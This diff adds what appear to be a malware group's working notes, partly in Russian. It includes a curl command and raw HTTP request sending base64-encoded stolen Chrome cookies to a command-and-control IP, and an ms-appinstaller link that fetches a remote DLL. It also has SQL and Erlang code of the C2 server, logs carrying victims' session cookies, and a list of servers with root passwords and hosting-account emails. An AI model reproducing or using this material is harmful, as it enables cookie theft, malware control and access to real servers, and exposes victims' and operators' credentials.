@@ -1,0 +1,331 @@
+SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )",
+
+curl -i -X POST \
+
+   -H "Content-Type:multipart/form-data" \
+
+   -F "data=dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|QU5JRA==|QUhXcVRVa3I0ZWhzWDY0ZW00S3JTMFprc2h0d0VzdXlsanBoNm5XOE1KZFg4NlJkMExNbEl6YmotMk9kNFFaQQ==|1588241125|1651313125|Lw==|1|1 dXNlcg==|Chrome|LnJlZ2lzdGVyLmNvbQ==|X191dG1h|MTk1NDMxOTg3LjU5MDA3MzIyNy4xNTg4MjQxMTQ0LjE1ODgyNDExNDQuMTU4ODI0MTE0NC4x|1588241143|1651313173|Lw==|0|0 dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|MVBfSkFS|MjAyMS0wOC0yMC0wNg==|1629440823|1632032823|Lw==|1|0 dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|TklE|MjIxPUlqcVRFLTlnYWpWUWNnTUgyNGVUcFBJMmFQYkYzZUJSamJOWXlDSXF1dXFhb2ttbktrNHk4THhOcVMzNm1LU0VpS0tLSjBISU5EdjZaUG4tcVJvZEMwbnZsWEhMZ2k3Vmx1eW92Z3VDQkttMksyNi1Md0dsYzJXTkNYbmtLWC1pa3NJczFNUEQzSExuNU1IX3dWQnQ4TExVdXRxT2dVMzlFVDhkeFktU2lGVQ==|1629440823|1645252023|Lw==|1|1" \
+
+   -F "source=Chrome cookies" \
+
+'https://31.14.40.220/TST150/WIN-D92SKISQ0JG_W639600.579036FF7F1C6D1A25B3F315D688968E/84/'
+
+ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host.com/1.dll
+
+POST /TST150/WIN-D92SKISQ0JG_W639600.579036FF7F1C6D1A25B3F315D688968E/84/ HTTP/1.1
+
+Accept: */*
+
+Content-Type: multipart/form-data; boundary=---------ILIRTLGXDQADQZQV
+
+Connection: Close
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+
+Host: 63.147.234.198:443
+
+Content-Length: 917
+
+Cache-Control: no-cache
+
+ 
+
+-----------ILIRTLGXDQADQZQV
+
+Content-Disposition: form-data; name="data"
+
+ 
+
+dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|QU5JRA==|QUhXcVRVa3I0ZWhzWDY0ZW00S3JTMFprc2h0d0VzdXlsanBoNm5XOE1KZFg4NlJkMExNbEl6YmotMk9kNFFaQQ==|1588241125|1651313125|Lw==|1|1
+
+dXNlcg==|Chrome|LnJlZ2lzdGVyLmNvbQ==|X191dG1h|MTk1NDMxOTg3LjU5MDA3MzIyNy4xNTg4MjQxMTQ0LjE1ODgyNDExNDQuMTU4ODI0MTE0NC4x|1588241143|1651313173|Lw==|0|0
+
+dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|MVBfSkFS|MjAyMS0wOC0yMC0wNg==|1629440823|1632032823|Lw==|1|0
+
+dXNlcg==|Chrome|Lmdvb2dsZS5jb20=|TklE|MjIxPUlqcVRFLTlnYWpWUWNnTUgyNGVUcFBJMmFQYkYzZUJSamJOWXlDSXF1dXFhb2ttbktrNHk4THhOcVMzNm1LU0VpS0tLSjBISU5EdjZaUG4tcVJvZEMwbnZsWEhMZ2k3Vmx1eW92Z3VDQkttMksyNi1Md0dsYzJXTkNYbmtLWC1pa3NJczFNUEQzSExuNU1IX3dWQnQ4TExVdXRxT2dVMzlFVDhkeFktU2lGVQ==|1629440823|1645252023|Lw==|1|1
+
+-----------ILIRTLGXDQADQZQV
+
+Content-Disposition: form-data; name="source"
+
+ 
+
+Chrome cookies
+
+-----------ILIRTLGXDQADQZQV--
+
+ 
+
+[9/9/2021 6:58:09 PM:880]
+
+HTTP/1.1 403 Forbidden
+
+connection: close
+
+server: Cowboy
+
+date: Thu, 09 Sep 2021 15:58:11 GMT
+
+content-length: 26
+
+SELECT type, filter FROM client_filter
+
+ 
+
+<<"true">> => true,
+
+<<"false">> => false,
+
+<<"id">> => Client#client.client_id,
+
+<<"client_ver">> => Client#client.client_ver,
+
+<<"name">> => Client#client.name,
+
+<<"group">> => Client#client.group,
+
+<<"ip">> => Client#client.ip_parsed,
+
+<<"country">> => Client#client.country,
+
+<<"sys_ver">> => Client#client.sys_ver,
+
+<<"importance">> => Client#client.importance,
+
+<<"userdefined">> => Client#client.userdefined
+
+ 
+
+вот зарезервированные слова для значений
+
+ 
+
+17:25:29.239 [info] HTTP command <<"1">>, [<<"Hello_token">>], {client,undefined,<<"asdgahjsdgajsdgjh.AABBCCDDAABBCCDDAABBCCDDAABBCCDD">>,undefined,undefined,<<"group1">>,undefined,undefined,undefined,undefined,undefined,undefined,undefined,1613496329,undefined,false,undefined,false,undefined,undefined}
+
+17:25:29.240 [info] equery <<"SELECT id, logged_at, importance, userdefined, sys_ver, devhash_1, devhash_2, devhash_3, devhash_4, country, is_manual_importance, created_at, last_activity FROM clients WHERE id_high = $1 AND id_low = $2">> [-6144092014192636707,-6144092014192636707]
+
+17:25:29.241 [info] Time path /group1/asdgahjsdgajsdgjh.AABBCCDDAABBCCDDAABBCCDDAABBCCDD/1/Hello_token:2449
+
+17:25:49.061 [info] HTTP command <<"10">>, [<<"1">>,<<"asd">>,<<"hello">>], {client,undefined,<<"asdgahjsdgajsdgjh.AABBCCDDAABBCCDDAABBCCDDAABBCCDD">>,undefined,undefined,<<"group1">>,undefined,undefined,undefined,undefined,undefined,undefined,undefined,1613496349,undefined,false,undefined,false,undefined,undefined}
+
+17:25:49.061 [info] Time path /group1/asdgahjsdgajsdgjh.AABBCCDDAABBCCDDAABBCCDDAABBCCDD/10/1/asd/hello:201
+
+{OK, IPPARSED} = INET: PARSE_ADDRESS (Clientip),
+
+IP of some curve
+
+но команду он понял: HTTP command <<"0">>, [<<"Windows XP SP3">>,<<"1001">>,<<"5.139.220.204">>,<<"97923686594599b400f716fa558d4d347f56c6e3230d65f752c43b3287fc3bea">>,<<"9clDtgGG9">>,<<>>], {client,undefined,<<"TRICKSOF-E5FA2F_W512600.9DE50B4F9A7211787402A39844CE7D79">>,undefined,undefined,<<"test2">>,undefined,undefined,undefined,undefined,undefined,undefined,undefined,1613496719,undefined,false,undefined,false,undefined,undefined}
+
+command(<<"0">>, [ SystemVersion, ClientVersion, ClientIp, BinDevHash, Token | _ ], Client, Req) ->
+
+позиция в URL
+
+<<"true">> => true,
+
+<<"false">> => false,
+
+<<"id">> => Client#client.client_id,
+
+<<"client_ver">> => Client#client.client_ver,
+
+<<"name">> => Client#client.name,
+
+<<"group">> => Client#client.group,
+
+<<"ip">> => Client#client.ip_parsed,
+
+<<"country">> => Client#client.country,
+
+<<"sys_ver">> => Client#client.sys_ver,
+
+<<"importance">> => Client#client.importance,
+
+<<"userdefined">> => Client#client.userdefined
+
+ 
+
+вот доступные идентификаторы колонок
+
+200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
+
+; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
+
+rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
+
+e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
+
+0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
+
+7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
+
+2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
+
+ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
+
+XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
+
+E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
+
+Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
+
+1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
+
+nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
+
+==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156
+
+ 
+
+...
+
+...........
+
+~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
+
+unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
+
+strix → defender
+
+ 
+
+"8.6.193.80:54567
+
+creepy/8gqprQURjQg5256J
+
+root/FbnoLRVKxxSr7Qu9 (MF60VYMP0S16)
+
+app.bitlaunch.io vlatislava@ro.ru Z8DWHATIAPE"
+
+"45.11.183.198:54567
+
+creepy/m7RRjPP6uh7XEN9U
+
+root/CkcFa6nfr7gZp4Ye (4b93d2f065)
+
+my.vps2day.com sunasos@ro.ru 2dd3b1f8ab"
+
+"88.119.175.208:54567
+
+creepy/RZjZemZvo9GHeqQi
+
+root/aiB7ZvpPQofQLqsP (AtJT365hqjBvN1aZ85) US
+
+bacloud.com/en/register ewok555@protonmail.com 5dCnLk8R938XxhZE 12EU"
+
+"104.161.32.44:54567
+
+creepy/HVRtL526PRnD25Fu
+
+root/MMGm2N5yEhV7BKzu (htUXGoilJBgOI80) US
+
+billing.indovirtue.com flourish@nibblefish.net 4ZWyzUNmHn23XwhM $5
+
+проплатить 1 числа"
+
+"144.202.43.124:54567
+
+creepy/8FW28sAvwUPoB73s
+
+root/AaJ9NdmpqeV4dsQr (64N4HMFXCBJO)
+
+app.bitlaunch.io samoma@ro.ru BBKAIDECSF0"
+
+"185.219.221.171:54567
+
+creepy/2KxbP7wQmFhFKtae
+
+root/Y6vSsKVv28xwF6DE (46d92b3dd3)
+
+my.vps2day.com totalto@ro.ru f6ebbea0b5"
+
+"194.76.226.22:54567
+
+creepy/2qibz8a9Mq4pLMP5
+
+root/E92XYW5gx3SfszKL (9aa516a7eb)
+
+my.vps2day.com celiden@ro.ru ec7ba6c935
+
+?????????? 8 ?????"
+
+"194.76.227.29:54567
+
+creepy/dHDTqK7iQ4hXnUrW
+
+root/wFM6dNksaH5p5MfL (e656c9d908)
+
+my.vps2day.com ebekka@ro.ru 5abadcfaba"
+
+"194.135.33.137:54567
+
+creepy/q2uHaVSJvxbSh8Ki
+
+root/QXV5bfKinJ89SNMu (yHYryRaSnvT4d) NL
+
+my.lyrahosting.com scrag@nibblefish.net yMj3NuWQMmxudK4w $8.99"
+
+"194.135.33.191:54567
+
+creepy/K4kCkcJAijH8TaUp
+
+root/tLc7kxiVedMRWSa5 (p85ureZtYgSs) NL
+
+my.lyrahosting.com trentor@tuta.io BegvXwwpvEztqWG3 8.99EU"
+
+"198.46.198.9:54567
+
+creepy/pCQwAH7v2AMrkgTZ
+
+root/Uan6eq7qJ46cxvsi (51AU1jtagfL2y27UFB) US
+
+harmony.pnzhost.com scrag@nibblefish.net UhJSAUaUDx3GUV5e $3.99"
+
+"pluto4-in
+
+5.2.78.121:54567
+
+creepy/RDBGZSv6u6GywCbE
+
+root/JpHwejgVuUJ25WJC (bd4a26130c6c9bac072557cd6803f431) NL
+
+clients.liteserver.nl mokko@inbox.lv T5aFhC4hEZ6vJJ93 5EU"
+
+"pluto4-mid
+
+198.244.193.207:54567
+
+creepy/PbvfAeuYk3HrV6iS
+
+root/mwYbFTyysyjopf8h (BTaM37TqFy5N3WKv) UK
+
+ca.hostgnome.com mokko@inbox.lv zQuunQHmbSF78Snt $3.99"
+
+"pluto4-out
+
+195.149.87.233:54567
+
+creepy/W4SNochhJ3UXwaJ3
+
+root/x98wmhQEGhvx4WfY (3514z5qBVc9m) US
+
+pq.hosting mokko@inbox.lv qaV8i2wCEVg9R8hN $3.85"
+
+"впн uranus-in
+
+31.214.157.242:54567
+
+creepy/Uz78YfT3pJ4GjYLE
+
+root/k5FnRLsQ7XgQr2NX (40877dcc17) NL
+
+my.vps2day.com bukazoid76@inbox.lv n7mTkvCEMhWppCgh 5EU"
+
+"впн uranus-out
+
+149.28.103.187:54567
+
+creepy/EqYzNptUDa6WEioX
+
+root/yPqszPE6AbRiMwNM (sk563oieKKW5ArPG) US
+
+app.bitlaunch.io bukazoid76@inbox.lv 7iQyRiiN6RbvgEQH $15"
